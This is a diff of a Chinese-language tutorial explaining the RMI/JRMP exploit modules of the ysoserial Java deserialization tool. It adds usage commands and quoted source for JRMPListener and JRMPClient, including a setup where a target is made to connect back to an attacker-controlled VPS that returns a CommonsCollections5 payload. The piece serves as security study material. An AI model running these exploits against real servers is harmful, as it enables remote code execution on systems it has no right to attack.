@@ -397,15 +397,31 @@ value在反序列化时就引发了后面的调用过程（PriorityQueue -> Tran
 
 ### 攻击Client
 
+
+
+
+
  ## YSOSERIAL中的RMI相关代码
 
 其实ysoserial中的很多代码利用了JDK RMI的实现代码，而且其`payloads`和`exploit`文件夹下的代码用途不尽相同，具体如下：
 
-### Exploit/RMIClient —— Payloads/RMIListener
+### Exploit/JRMPClient —— Payloads/JRMPListener
 
-#### `Payloads/RMIListener`
+这俩exp经常一起使用，其用法如下：
 
-这俩exp经常一起使用，这里分开介绍一下吧。`Payloads/RMIListener`令服务端开启一个RMI监听端口，要求服务端存在一个反序列化的接口，其调用栈如代码注释所写：
+```powershell
+## 1. 生成JRMPListener的payload.bin
+java -jar ysoserial-xxx.jar JRMPListner [port] > payload.bin
+## 2. 将payload.bin发送给服务端让其反序列化，这会在服务器上开启一个端口
+## 3. 用JRMPClient生成payload并发起连接，将攻击payload发给它：
+java -cp ysoserial-xxx.jar ysoserial.exploit.JRMPClient [targetIp] [port] [payload_type] [payload_arg]
+```
+
+这里分开介绍一下吧。
+
+#### `Payloads/JRMPListener`
+
+`Payloads/JRMPListener`令服务端开启一个RMI监听端口，要求服务端存在一个反序列化的接口，其调用栈如代码注释所写：
 
 ```java
 /**
@@ -446,9 +462,9 @@ public class JRMPListener extends PayloadRunner implements ObjectPayload<Unicast
 
 因为`ActivationGroupImpl类`和 `ActivationGroup类`都没实现`readObject()`方法，所以它们会继承其父类的方法。在反序列化过程中就发生了注解中的调用，最终的效果是在服务端开启特定端口。
 
-#### `Exploit/RMIClient ` 
+#### `Exploit/JRMPClient ` 
 
-既然打出`Payloads/RMIListener`后服务端上多了一个TCP端口，接着我们就可以用`Exploit/RMIClient ` 发起DGC调用了（DGC，Distributed Gabage Collection，分布式垃圾回收，可以看做RMI协议下的一条指令，用来回收对象调用方不再使用的引用），总之会发生与RMI有关的通信。其实现代码如下：
+既然打出`Payloads/JRMPListener`后服务端上多了一个TCP端口，接着我们就可以用`Exploit/JRMPClient ` 发起DGC调用了（DGC，Distributed Gabage Collection，分布式垃圾回收，可以看做RMI协议下的一条指令，用来回收对象调用方不再使用的引用），总之会发生与RMI有关的通信。其实现代码如下：
 
 ```java
 public static final void main ( final String[] args ) {
@@ -506,11 +522,203 @@ public static final void main ( final String[] args ) {
     }    
 ```
 
+最终造成攻击的前提依然是服务端classpath存在payload执行所需的类，`makeDGCCall()`方法大体过程就是创建一个socket，并按协议约定的格式向其中填入数据。用一个重写了`annotateClass()`方法的`MarshalOutputStream`类将PayloadClass也填入socket的缓冲区，最后用`flush()`发送出去。
 
+### Exploit/JRMPListener —— Payloads/JRMPClient
 
-### Exploit/RMIListener —— Payloads/RMIClient
+这俩exp也是配套使用，用法如下：
 
-这俩代码通常一起使用，
+```powershell
+## 1.用JRMPClient生成payload
+java -jar ysoserial-xxx.jar JRMPClient [vpsIP]:[port] > payload.bin
+## 2.将payload.bin发送给服务端让其反序列化，这会令服务器上向vps发起连接请求
+## 3.这里的vps由我们控制，其上面开启了JRMPListener，在收到连接请求后会将攻击payload发送给它
+java -cp ysoserial-xxx.jar ysoserial.exploit.JRMPListener [port] [payload_type] [payload_arg]
+```
+
+#### `Payloads/JRMPClient`
+
+payload的生成过程如下：
+
+```java
+public Registry getObject ( final String command ) throws Exception {
+
+    String host;
+    int port;
+    int sep = command.indexOf(':');
+    if ( sep < 0 ) {
+        port = new Random().nextInt(65535);
+        host = command;
+    }
+    else {
+        host = command.substring(0, sep);
+        port = Integer.valueOf(command.substring(sep + 1));
+    }
+    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+    TCPEndpoint te = new TCPEndpoint(host, port);
+    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+    // 创建一个Registry接口的代理对象proxy，它被作为payload返回
+    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, obj);
+    return proxy;
+}
+```
+
+在生成的payload被反序列化过程中，因为JDK动态代理实际上是生成了$Proxy类对象，其成员变量包括InvocationHandler对象，故会对obj对象（RemoteObjectInvocationHandler类）反序列化，会调用该父类RemoteObject类的`readObject()`方法：
+
+```java
+private void readObject(java.io.ObjectInputStream in)
+    throws java.io.IOException, java.lang.ClassNotFoundException
+{
+    String refClassName = in.readUTF();
+    if (refClassName == null || refClassName.length() == 0) {
+        ref = (RemoteRef) in.readObject();
+    } else {
+        String internalRefClassName = RemoteRef.packagePrefix + "." + refClassName;
+        Class refClass = Class.forName(internalRefClassName);
+        try {
+            ref = (RemoteRef) refClass.newInstance();
+        } catch (InstantiationException e) { 
+            // **** SNIP ****
+        }
+        ref.readExternal(in);
+    }
+}
+```
+
+依据payload的生成过程，可知`refClassName`实际上是`UnicastRef.class`，因此会进入else子句，并开启`ref.readExternal(in)`。后面的调用过程不再详述，具体见下图，最终建立一个TCPEndpoint，向我们控制的vps发送DGC请求，这个过程实际和RMIRegistry的DGC部分一致。
+
+![](Ysoserial工具解读（六）\payloads_client.jpg)
+
+#### `Exploit/JRMPListener`
+
+JRMPListener所做的工作是接受这一请求，再生成攻击payload并发送回去。代码如下：
+
+```java
+public static final void main ( final String[] args ) {
+
+    if ( args.length < 3 ) {
+        System.err.println(JRMPListener.class.getName() + " <port> <payload_type> <payload_arg>");
+        System.exit(-1);
+        return;
+    }
+
+    // 这里根据命令行参数生成payload
+    final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);
+
+    try {
+        int port = Integer.parseInt(args[ 0 ]);
+        System.err.println("* Opening JRMP listener on " + port);
+        JRMPListener c = new JRMPListener(port, payloadObject);
+        c.run();
+    }
+    catch ( Exception e ) {
+        System.err.println("Listener error");
+        e.printStackTrace(System.err);
+    }
+    Utils.releasePayload(args[1], payloadObject);
+}
+
+public void run () {
+    try {
+        Socket s = null;
+        try {
+            while ( !this.exit && ( s = this.ss.accept() ) != null ) {
+                try {
+                    s.setSoTimeout(5000);
+                    InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
+                    System.err.println("Have connection from " + remote);
+
+                    InputStream is = s.getInputStream();
+                    InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);
+
+                    // Read magic (or HTTP wrapper)
+                    bufIn.mark(4);
+                    DataInputStream in = new DataInputStream(bufIn);
+                    int magic = in.readInt();
+
+                    short version = in.readShort();
+                    if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
+                        s.close();
+                        continue;
+                    }
+
+                    OutputStream sockOut = s.getOutputStream();
+                    BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
+                    DataOutputStream out = new DataOutputStream(bufOut);
+
+                    byte protocol = in.readByte();
+                    switch ( protocol ) {
+                        case TransportConstants.StreamProtocol:
+             				// **** SNIP ****
+                        case TransportConstants.SingleOpProtocol:
+                            doMessage(s, in, out, this.payloadObject);
+                            break;
+                        default:
+                        case TransportConstants.MultiplexProtocol:
+                            System.err.println("Unsupported protocol");
+                            s.close();
+                            continue;
+                    }
+
+                    bufOut.flush();
+                    out.flush();
+ 			// **** SNIP ****
+}
+                
+private void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
+	System.err.println("Reading message...");
+    int op = in.read();
+    switch ( op ) {
+        case TransportConstants.Call:
+            // service incoming RMI call
+            doCall(in, out, payload);
+	// **** SNIP ****
+}      
+    
+private void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
+	ObjectInputStream ois = new ObjectInputStream(in) {
+
+    ObjID read;
+	try {
+        read = ObjID.read(ois);
+    }
+	catch ( java.io.IOException e ) {
+        throw new MarshalException("unable to read objID", e);
+    }
+
+	if ( read.hashCode() == 2 ) {
+        ois.readInt(); // method
+        ois.readLong(); // hash
+        System.err.println("Is DGC call for " + Arrays.toString((ObjID[])ois.readObject()));
+    }
+
+	System.err.println("Sending return with payload for obj " + read);
+
+    out.writeByte(TransportConstants.Return);// transport op
+    // 生成MarshallOutputStream类的oos对象，开始写入payload对象
+	ObjectOutputStream oos = new JRMPClient.MarshalOutputStream(out, this.classpathUrl);
+    // 返回数据类型为异常类
+	oos.writeByte(TransportConstants.ExceptionalReturn);
+	new UID().write(oos);
+
+	BadAttributeValueExpException ex = new BadAttributeValueExpException(null);
+	Reflections.setFieldValue(ex, "val", payload);
+	oos.writeObject(ex);
+
+	oos.flush();
+	out.flush();
+
+	this.hadConnection = true;
+	synchronized ( this.waitLock ) {
+		this.waitLock.notifyAll();
+	}
+}    
+```
+
+这里生成payload实际用的CommonsCollections5中`BadAttributeValueExpException.val`成员变量做的最外层包裹，实际的反序列化过程可以看做CommonsCollections5和payload调用链的组合。这里也不再赘述。下图为JRMPListener的打印信息。
+
+![](Ysoserial工具解读（六）\vps_Listener.jpg)
 
 ## References
 
@@ -518,6 +726,7 @@ public static final void main ( final String[] args ) {
 * https://xz.aliyun.com/t/2649
 * https://xz.aliyun.com/t/2651 
 * https://xz.aliyun.com/t/2650 
+* [https://www.cnblogs.com/yeyang/p/10087293.html]()
 * https://www.anquanke.com/post/id/194384 
 * https://www.anquanke.com/post/id/190468
 
